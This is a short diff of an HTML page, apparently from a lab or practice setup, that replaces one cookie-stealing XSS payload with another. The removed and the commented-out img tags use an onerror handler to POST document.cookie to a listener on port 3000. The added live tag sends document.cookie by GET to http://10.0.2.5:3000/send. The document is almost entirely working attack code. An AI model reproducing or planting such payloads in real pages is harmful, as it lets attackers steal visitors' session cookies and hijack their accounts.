@@ -1,7 +1,8 @@
 <html>
 <body>
 	<h1> Hello world</h1>
-	<img src="./troll.jpg" onerror="console.log('begin'); var cookieValues = document.cookie; var xhr = new XMLHttpRequest(); var url = 'http://10.0.2.15:3000'; xhr.open('POST', url, true); xhr.setRequestHeader('Content-type', 'application/json'); var data = JSON.stringify({'cookie':cookieValues}); xhr.send(data); console.log('end'); "/>
+	<!--img src="./troll.jpg" onerror="console.log('begin'); var cookieValues = document.cookie; var xhr = new XMLHttpRequest(); var url = 'http://localhost:3000'; xhr.open('POST', url, true); xhr.setRequestHeader('Content-type', 'application/json'); var data = JSON.stringify({'cookie':cookieValues}); xhr.send(data); console.log('end'); "/-->
+
+	<img src="./troll-get.jpg" onerror="var url = 'http://10.0.2.5:3000/send?c=' + document.cookie;var xmlHttp = new XMLHttpRequest();xmlHttp.open('GET', url , false);xmlHttp.send(null);"/>
 </body>
 </html>
-
